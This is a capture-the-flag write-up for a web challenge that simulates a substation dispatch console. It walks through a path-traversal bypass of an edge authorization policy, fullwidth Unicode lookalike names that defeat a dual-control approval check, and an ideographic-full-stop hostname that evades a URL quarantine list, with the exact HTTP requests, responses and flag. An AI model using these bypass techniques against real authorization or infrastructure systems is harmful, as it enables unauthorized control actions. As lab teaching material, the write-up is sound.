# Interlock

**Author:** mar

**Web** · 593 pts (hard)
Instance: `w05.ctf.chronos-security.ro:32857` — VNTA-Grid/1.4, substation **KELD RIDGE**
No handout: the console links its own schema at `/api/v1/schema`.

**TL;DR.** The dispatcher edge "authorizes on the request path as received", so
`POST /api/v1/../../ops/delegates` reaches the operator API while a literal `/ops/...` is refused.
The roster matches engineers with NFKC + casefold, but delegate uniqueness and the "distinct
principals" test only casefold, so `ｋ.vostra` and `a.torvｏ` are two different principals that both
pass the roster check — that is the dual-control bypass. The quarantine on `sg-kr.grid.test` is
enforced by `fast-uri` 3.1.2, which does not fold the ideographic full stop `U+3002`; the fetcher's
WHATWG parser does. `http://sg-kr。grid。test/dispatch` therefore misses the quarantine match and
resolves to the real gateway. A signed isolation order plus the documented
`sha256("interlock|<order_id>|<buses>")` unlock returns the receipt and its clearance code.

## Solve

**Reconnaissance.** The root is a read-only observer desk for the Keld Ridge cluster. It links three
useful JSON endpoints:

| endpoint | what it gives |
| --- | --- |
| `/api/v1/schema` | cluster (`KR-B1`, `KR-B2`, gateway `sg-kr.grid.test`), dual-control policy, delegate uniqueness, operations API, dispatch validation and the unlock formula |
| `/reference/roster` | `matching: "NFKC+casefold"`, engineers `k.vostra`, `r.mendal`, `a.torvo` |
| `/audit/ledger` | `02:48Z  k.vostra  quarantine.add  sg-kr.grid.test` |

The schema is the whole map (abridged):

```json
{"edge":{"policy":"authorizes on the request path as received"},
 "cluster":{"substation":"KELD RIDGE","buses":["KR-B1","KR-B2"],
            "gateway":"sg-kr.grid.test"},
 "dual_control":{"requester":"roster","approver":"roster","distinct":true},
 "delegates":{"uniqueness":"casefold"},
 "operations":{"endpoints":[
   {"method":"POST","path":"/ops/delegates","body":["name"],"returns":["token","name"]},
   {"method":"POST","path":"/ops/orders","body":["bus","requester_token"],"returns":["order_id","status"]},
   {"method":"POST","path":"/ops/orders/approve","body":["order_id","approver_token"],"returns":["order_id","status"]},
   {"method":"POST","path":"/ops/dispatch","body":["order_id","target","unlock"]}]},
 "dispatch":{"target_validation":{"parser":"fast-uri","version":"3.1.2"},
             "release_unlock":{"algorithm":"sha256-hex",
               "input":"interlock|<order_id>|<bus identifiers joined by comma>"}}}
```

**1. Edge path-policy bypass.** The edge authorizes the path string before the backend normalises
it. Literal `/ops/...` is blocked; a path that starts with an allowed prefix but normalises into
`/ops` is not:

```http
POST /ops/delegates                 -> 403 {"error":"policy.path_restricted"}

POST /api/v1/../../ops/delegates    -> 201 {"token":"tok-1","name":"..."}
POST /api/v1/../../ops/orders       -> 200 {"order_id":"ord-3","status":"awaiting_approval"}
POST /api/v1/../../ops/dispatch     -> 409 {"error":"order.not_signed"}
```

The literal `..` segments survive to the backend, which normalises them into `/ops/...`. `%2e%2e`
works as well; `%2f` for the slashes returns 404. The card's `curl --path-as-is` warning is the
operational detail: a client that rewrites `..` before sending never reaches the backend with the
path intact.

**2. Dual control with NFKC lookalikes.** `/ops/delegates` reserves the plain roster names
(`409 principal.exists`), and ASCII near-misses such as `k.vostra ` or `k.vostra2` fail the roster
check (`403 requester.not_on_roster`). Names that are **NFKC-equivalent to a roster entry but
byte-distinct** pass both tests:

```http
POST /api/v1/../../ops/delegates {"name":"ｋ.vostra"}   -> 201 tok-1   (U+FF4B fullwidth k)
POST /api/v1/../../ops/delegates {"name":"a.torvｏ"}    -> 201 tok-2   (U+FF4F fullwidth o)
```

The roster check normalises with NFKC + casefold, so both are "on the roster". Delegate uniqueness
and the dual-control "distinct principals" test only casefold the stored bytes, so the two
spellings are different principals. The same token used twice is rejected
(`403 dual_control.same_principal`), which is the point: one engineer's identity, two principals.

**3. Get a signed order.** In the intended path the two delegate tokens are enough:

```http
POST /api/v1/../../ops/orders
{"bus":"KR-B1","requester_token":"tok-1"}
-> 200 {"order_id":"ord-3","status":"awaiting_approval"}

POST /api/v1/../../ops/orders/approve
{"order_id":"ord-3","approver_token":"tok-2"}
-> 200 {"order_id":"ord-3","status":"signed"}
```

On the live deployment the approval signing upstream was down on freshly created instances
(`502 {"error":"upstream.unavailable"}`), so new orders stayed `awaiting_approval`. The pooled
dispatcher nodes already carried signed orders — `ord-3`, `ord-6`, `ord-9`, `ord-12`, `ord-15` were
seen on the instance used here. A signed order is distinguishable without sending a real dispatch by
pointing it at a syntactically broken URL:

```http
POST /api/v1/../../ops/dispatch
{"order_id":"ord-N","target":"http:%2f%2fsg-kr.grid.test/","unlock":"..."}
-> 409 {"error":"order.not_signed"}                     unsigned order
-> 502 {"error":"gateway_unreachable","detail":"TypeError: Failed to parse URL ..."}  signed order
```

The parsing error proves the dispatcher got as far as the fetcher, which only happens for a signed
order.

**4. Build the unlock.** The schema fixes the digest:

```
unlock = sha256("interlock|<order_id>|<bus identifiers joined by comma>").hexdigest()
```

For a two-bus order such as `ord-12`:

```python
unlock = hashlib.sha256(b"interlock|ord-12|KR-B1,KR-B2").hexdigest()
```

A wrong bus set produces a held receipt that leaks the exact input back:

```json
422 {"error":"receipt.held","unlock_algorithm":"sha256-hex",
     "unlock_input":"interlock|ord-15|KR-B1,KR-B2"}
```

**5. Bypass the quarantine with U+3002.** The dispatcher validates the target with `fast-uri` 3.1.2.
The plain gateway target is caught by the 02:48Z quarantine entry:

```http
POST /api/v1/../../ops/dispatch
{"order_id":"ord-12","target":"http://sg-kr.grid.test/dispatch","unlock":"..."}
-> 409 {"error":"target.quarantined","listed_at":"02:48Z","by":"k.vostra"}
```

Case, a trailing dot, an explicit `:80`, and percent-encoded dots are all normalised into the
quarantine match. `fast-uri` does **not** fold Unicode full stops, but the WHATWG URL parser used by
the fetcher maps the ideographic full stop `U+3002` (`。`) to `.`. The parsed host is therefore a
different string to the quarantine check and the real gateway to the fetcher:

```http
POST /api/v1/../../ops/dispatch
{"order_id":"ord-12",
 "target":"http://sg-kr\u3002grid\u3002test/dispatch",
 "unlock":"<sha256 of interlock|ord-12|KR-B1,KR-B2>"}

200 {"order_id":"ord-12","status":"delivered",
     "receipt":{"bus":["KR-B1","KR-B2"],"order_id":"ord-12",
                "receipt":"isolation executed",
                "release_token":"CSCTF{3Xs7fPsyuJG8945ZAnSaAjKm}",
                "station":"KELD RIDGE"}}
```

The same `release_token` came back on three independent signed orders (`ord-9`, `ord-6`, `ord-3`),
so the marker is stable across the seeded set, not a one-order fluke.

**Dead ends (all measured).**

- **Literal `/ops/...`.** 403 `policy.path_restricted` on every method. `%2f`-encoded slashes return
  404; only literal `..` and `%2e%2e` survive to the backend.
- **Plain roster names.** 409 `principal.exists`; ASCII lookalikes (`k.vostra `, `k.vostra2`,
  `K.VOSTRA`) fail the roster check with 403 `requester.not_on_roster`.
- **Same principal twice.** The dual-control check is real: 403 `dual_control.same_principal`.
  Unknown tokens are 404. The bypass needs two NFKC-equivalent spellings, not a replay.
- **Fresh-instance approval.** `POST /ops/orders/approve` returns 502 `upstream.unavailable` on
  every freshly created instance; the instance often terminates immediately afterwards. This is a
  deployment problem, not a policy problem — signed orders already existed on the pooled dispatcher
  nodes.
- **Quarantine normalisations.** `SG-KR.GRID.TEST`, `sg-kr.grid.test.`, `sg-kr.grid.test:80` and
  `sg-kr%2egrid%2etest` are all folded into the quarantine match. Only the Unicode full stop misses
  `fast-uri` while still resolving in the fetcher.
- **Gateway root.** `http://sg-kr.grid.test/` returns a non-JSON 500 `internal_error`; the gateway
  route is `/dispatch`, which is why the target needs the path.
- **Wrong unlock.** 422 `receipt.held` before any receipt is released; the response itself gives the
  exact `unlock_input`, which is useful but does not bypass the signature.

**Flag:** `CSCTF{3Xs7fPsyuJG8945ZAnSaAjKm}`

Run [solve.py](solve.py) with `python3 solve.py http://<host>:<port>`. It walks the edge bypass,
finds a signed order with the parse-error oracle (or mints one from two lookalike delegates when the
signing upstream is alive), builds the unlock and dispatches through the `U+3002` target.

*AI: Hermes (DeepSeek 4.1 Flash) assembled this writeup from the team's live-instance work log
(`ctf-keldridge/WRITEUP.md`, `STATUS.md`), the captured schema/roster/ledger and
`solve_keld_final.py`; the flag is the one the platform accepted at 2026-11-06 19:59:53Z.*
